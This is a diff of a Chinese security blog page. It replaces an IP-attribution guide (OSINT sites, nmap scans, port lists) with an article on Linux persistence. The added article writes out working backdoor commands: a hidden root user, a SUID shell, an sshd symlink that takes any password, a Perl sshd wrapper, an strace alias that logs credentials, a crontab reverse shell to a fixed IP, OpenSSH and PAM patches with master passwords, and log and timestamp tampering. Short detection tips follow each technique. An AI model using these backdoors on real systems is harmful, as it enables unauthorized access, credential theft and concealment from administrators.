@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-30
+                    2023-04-03
                 </div>
                 
 
@@ -464,268 +464,112 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="IP溯源"><a href="#IP溯源" class="headerlink" title="IP溯源"></a>IP溯源</h1><p>溯源过程中<strong>切勿用客户的网络</strong>去访问，防止对方的VPS上有JS钩子，导致对方拥有我的网络信息，<strong>尽量用虚拟机、浏览器无痕等模式进行访问</strong></p>
-<h2 id="判断IP状态"><a href="#判断IP状态" class="headerlink" title="判断IP状态"></a>判断IP状态</h2><ul>
-<li>静动态判断<ul>
-<li>国内<ul>
-<li>存在rDNS为静态     <a target="_blank" rel="noopener" href="http://www.ipip.net/">www.ipip.net</a> </li>
-<li>查询相关备案信息   ipwhois.cnnic.net.cn <ul>
-<li>ALLOCATED PORTABLE 动态IP，5G&#x2F;4G&#x2F;家庭宽带等</li>
-<li>ALLOCATED NON-PORTABLE  静态IP，专线宽带&#x2F;IDC机房&#x2F;企业出口</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h2><h3 id="反查"><a href="#反查" class="headerlink" title="反查"></a>反查</h3><ul>
-<li>国内<ul>
-<li><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a target="_blank" rel="noopener" href="https://quake.360.cn/">https://quake.360.cn/</a></li>
-</ul>
-</li>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a><br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul>
-<li>国外<ul>
-<li><a target="_blank" rel="noopener" href="https://www.whois.net/default.aspx">https://www.whois.net/default.aspx</a></li>
-<li><a target="_blank" rel="noopener" href="https://who.is/">https://who.is/</a></li>
-<li><a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a></li>
-</ul>
-</li>
-<li>国内<ul>
-<li><a target="_blank" rel="noopener" href="https://www.benmi.com/rwhois?q=">https://www.benmi.com/rwhois?q=</a></li>
-<li><a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
-<li>不好用<ul>
-<li><a target="_blank" rel="noopener" href="http://whois.xinnet.com/">http://whois.xinnet.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><ul>
-<li><p>网站查备案</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.chaicp.com/">https://www.chaicp.com/</a></li>
-<li><a target="_blank" rel="noopener" href="https://gaj.sh.gov.cn/wa/newlogin/recordSearch.jsp">https://gaj.sh.gov.cn/wa/newlogin/recordSearch.jsp</a></li>
-</ul>
-</li>
-<li><p>同一个备案&#x2F;许可证号的网站</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></li>
-</ul>
-</li>
-</ul>
-<h3 id="判断IP是否为CDN"><a href="#判断IP是否为CDN" class="headerlink" title="判断IP是否为CDN"></a>判断IP是否为CDN</h3><ul>
-<li>原理<ul>
-<li>根据 Host 字段判断是否为绑定域名，进行跳转</li>
-</ul>
-</li>
-<li>特征<ul>
-<li>CDN会绑定许多域名</li>
-</ul>
-</li>
-<li>判断<ul>
-<li>对反绑的域名进行查询 nslookup<ul>
-<li>nslookup  -q&#x3D;cname baidu.com</li>
-</ul>
-</li>
-<li><a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> 查询</li>
-<li>访问IP<ul>
-<li>通过ModHeader 修改 Host 字段值为域名</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="VPS供应商相关"><a href="#VPS供应商相关" class="headerlink" title="VPS供应商相关"></a><strong>VPS供应商相关</strong></h3><ul>
-<li>查询地址<ul>
-<li><a target="_blank" rel="noopener" href="https://myip.ms/">https://myip.ms</a><br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a></li>
-</ul>
-</li>
-<li>常见的VPS厂商<ul>
-<li>DIGITALOCEAN</li>
-<li>Linode</li>
-</ul>
-</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul>
-<li>子域名：子域名的实时解析IP和历史解析IP都可以作为新的IP进行溯源关联<ul>
-<li>OneForAll — 扫描子域<ul>
-<li>python oneforall.py –target example.com run</li>
-</ul>
-</li>
-<li>teemo — 扫描邮箱<ul>
-<li>python teemo.py -d</li>
-</ul>
-</li>
-<li>subDomainsBrute — 扫描真实IP<ul>
-<li>python subDomainsBrute.py –full</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>互联网扫描库<ul>
-<li>censys.io&#x2F;ipv4 判断是否有开放端口，或者<strong>对C段分析</strong></li>
-<li>fofa.so    ip&#x3D;”11111”</li>
-<li>shodan.io</li>
-</ul>
-</li>
-<li>威胁情报库：收集关键字 反查信息：域名、邮箱<ul>
-<li>国内：<ul>
-<li>微步在线   x.threatbook.cn</li>
-</ul>
-</li>
-<li><strong>国外的</strong>：<a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com</a>  — 比较全面<br>          <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/search">https://www.virustotal.com/gui/search</a>  —- 常用，需要登录</li>
-</ul>
-</li>
-</ul>
-<h2 id="第三方暴露库"><a href="#第三方暴露库" class="headerlink" title="第三方暴露库"></a>第三方暴露库</h2><ul>
-<li><p>国内</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="http://www.zoomeye.org/">http://www.zoomeye.org/</a></li>
-<li>​       <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br> ​       <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li>
-</ol>
-</li>
-<li><p>国外<br>   <a target="_blank" rel="noopener" href="https://censys.io/ipv4">https://censys.io/ipv4</a><br>   <a target="_blank" rel="noopener" href="https://community.riskiq.com/">https://community.riskiq.com/</a><br>   <a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a><br>   <a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></p>
-</li>
-</ul>
-<h2 id="IP端口"><a href="#IP端口" class="headerlink" title="IP端口"></a>IP端口</h2><ul>
-<li><p>使用 nmap 扫描端口 ——切勿用客户的网络进行扫描</p>
-<ul>
-<li><p>nmap T4 -Pn 192.168.131.1	快速扫描top1000端口<br>nmap -Pn -p- -A -sV -oN 123.txt 127.0.0.1	全扫描</p>
-</li>
-<li><p>根据端口判断是否为跳板机</p>
-<ul>
-<li><pre><code>5555:SoftEther VPN
-1723:PPTP VPN
-500:L2TP VPN
-4500:L2TP VPN
-1701:L2TP VPN
-1194:Openvpn
-5000:Vtun 
-12975:	LogMeIn Hamachi
-1080:其他SOCKS5类代理常用端口
-</code></pre>
-</li>
-</ul>
-</li>
-<li><p>C&amp;C监听端口或黑客工具端口<br>50050	Cobalt Strike<br>8080	   nps	一些自定义木马也喜欢用这种类型的端口<br>8834	   nessusWeb	界面管理端口<br>4444	   hfs</p>
-</li>
-</ul>
-</li>
-<li><p>对C段资产进行分析</p>
-<ul>
-<li>nmap -sP -oN 123.txt  192.168.131.0&#x2F;24</li>
-<li>存在大量的 80&#x2F;443 端口该C段为IDC或企业的概率比较大</li>
-</ul>
-</li>
-</ul>
-<h2 id="IP地址定位"><a href="#IP地址定位" class="headerlink" title="IP地址定位"></a>IP地址定位</h2><ul>
-<li>IP定位常用网站<ul>
-<li>国内<ul>
-<li>IP 定位<ul>
-<li><a target="_blank" rel="noopener" href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a><br><a target="_blank" rel="noopener" href="https://www.ipplus360.com/">https://www.ipplus360.com/</a><br><a target="_blank" rel="noopener" href="http://www.chaipip.com/">www.chaipip.com</a><br><a target="_blank" rel="noopener" href="https://met.red/h/location/queryIp">https://met.red/h/location/queryIp</a></li>
-</ul>
-</li>
-<li>综合查询<ul>
-<li><a target="_blank" rel="noopener" href="http://www.ipip.net/">www.ipip.net</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>国外<ul>
-<li>iplocation.com<br><a target="_blank" rel="noopener" href="https://dev.maxmind.com/geoip/geoip2/geolite2/">https://dev.maxmind.com/geoip/geoip2/geolite2/</a></li>
-<li>综合信息查询<ul>
-<li><a target="_blank" rel="noopener" href="https://bgp.he.net/">https://bgp.he.net/</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>高德地图法<ul>
-<li>修改 X-Forwarded-For 为IP地址，再次刷新</li>
-</ul>
-</li>
-<li>地址搜出来之后，通过地图搜索附近的公司</li>
-</ul>
-<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><ul>
-<li>对查询页面进行相关的搜索<ul>
-<li>com、cn  网站</li>
-<li>@  邮箱</li>
-</ul>
-</li>
-</ul>
-<h1 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h1><ul>
-<li><p>Github 搜索关键字</p>
-<ul>
-<li>查看相关代码（code），部分会在注释中署名。</li>
-</ul>
-</li>
-<li><h2 id="利用-Google-hack-语法搜索邮箱、域名等关键字"><a href="#利用-Google-hack-语法搜索邮箱、域名等关键字" class="headerlink" title="利用 Google hack 语法搜索邮箱、域名等关键字"></a>利用 Google hack 语法搜索邮箱、域名等关键字</h2><ul>
-<li>intext:”xxxx”</li>
-</ul>
-</li>
-<li><p>IP直接搜索</p>
-<ul>
-<li>某些论坛可能会对用户访问的IP进行记录</li>
-</ul>
-</li>
-</ul>
-<h1 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h1><ul>
-<li>.dotm	邮件钓鱼<ul>
-<li>Normal.dotm   为word的启动模板</li>
-</ul>
-</li>
-<li>HTTPAPI 2.0   为Windows默认开启的80端口的标识</li>
-<li>对IP反查时建议也加上自动化漏扫，扫出来有漏洞数量多的为 <strong>跳板机&#x2F;肉鸡</strong></li>
-</ul>
-<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>161.35.76.1</p>
-<ul>
-<li>直接搜索IP，判断国内还是国外</li>
-<li>国外：virustotal.com&#x2F;gui&#x2F;search<ul>
-<li>查看VPS厂商 Autonomous System Label<ul>
-<li>Autonomous System Label	DIGITALOCEAN-ASN（VPS厂商）</li>
-</ul>
-</li>
-<li>查看关联的信息 ：Relation<ul>
-<li>有关联的 CS木马信息、邮件钓鱼</li>
-</ul>
-</li>
-<li>报毒情况<ul>
-<li>Detection    52&#x2F;72    72款杀毒软件、52款报毒</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>暴露库查询：<a target="_blank" rel="noopener" href="https://censys.io/ipv4">https://censys.io/ipv4</a><ul>
-<li>22 <strong>Banner</strong>：SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3<ul>
-<li>发现该VPS为 Ubuntu</li>
-</ul>
-</li>
-<li>443 HTTPS 中的 SSL 证书：C&#x3D;US, ST&#x3D;, L&#x3D;, O&#x3D;jQuery, OU&#x3D;Certificate Authority, CN&#x3D;jquery.com<ul>
-<li>jquery.com为SSL证书绑定的域名，jquery.com为默认域名</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>172.105.87.139</p>
-<ul>
-<li><h2 id="国外：virustotal-com-x2F-gui-x2F-search-查看关联的信息-：Relation-域名绑定：Domain"><a href="#国外：virustotal-com-x2F-gui-x2F-search-查看关联的信息-：Relation-域名绑定：Domain" class="headerlink" title="国外：virustotal.com&#x2F;gui&#x2F;search- 查看关联的信息 ：Relation  - 域名绑定：Domain"></a>国外：virustotal.com&#x2F;gui&#x2F;search<br>- 查看关联的信息 ：Relation<br>  - 域名绑定：Domain</h2></li>
-</ul>
+                <p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p>
+<p><strong>1、一句话添加用户和密码</strong></p>
+<p>添加普通用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line">	</span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">	</span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+
+<p>添加root用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>
+
+<p>可疑用户排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、SUID Shell</strong></p>
+<p>Suid shell是一种可用于以拥有者权限运行的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>使用guest用户登录就可疑获取root权限。</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-1.png"></p>
+<p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm /4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm /2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>3、ssh公私钥免密登录</strong></p>
+<p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~&#x2F;.ssh&#x2F;authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p>
+<p>客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>过程中按三次回车，执行结束如下图:</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-2.png"></p>
+<p>进入&#x2F;root&#x2F;.ssh&#x2F;文件夹，查看文件夹的内容，如下所示：</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-3.png"></p>
+<p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p>
+<p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p>
+<p><strong>4、软连接</strong></p>
+<p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: &#x2F;etc&#x2F;pam.d&#x2F;su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p>
+<p>在目标服务器上执行一句话后门：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>
+
+<p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-4.png"></p>
+<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-4-1.png"></p>
+<p><strong>5、SSH wrapper</strong></p>
+<p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+<p>服务端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.%5Cimage%5Cprivilege-5-5.png"></p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al /usr/sbin/sshd</span><br><span class="line"># cat /usr/sbin/sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>6、strace后门</strong></p>
+<p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source /root/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.%5Cimage%5Cprivilege-5-5-1.png"></p>
+<p>排查技巧：使用<code>alias</code>即可发现异常。</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-5-2.png"></p>
+<p><strong>7、crontab反弹shell</strong></p>
+<p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p>
+<p>a、创建shell脚本，例如在&#x2F;etc&#x2F;evil.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><code>chmod +sx /etc/evil.sh</code></p>
+<p>b、crontab -e 设置定时任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>
+
+<p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-6.png"></p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看可疑的定时任务列表</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>8、openssh后门</strong></p>
+<p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">	#define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码</span><br><span class="line">	#define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码</span><br><span class="line">	#define SECRETPW &quot;123456789&quot;          //后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">	#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">	#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line">	</span><br><span class="line">e、安装并编译</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：利用strace找出ssh后门.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>9、PAM后门</strong></p>
+<p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p>
+<p>利用方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat /lib/security/pam_unix.so      #32位</span><br><span class="line">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>10、rookit后门</strong></p>
+<p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
+<p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p>
+<p>连接后的截图：</p>
+<p><img src="/.%5Cimage%5Cprivilege-5-7.png"></p>
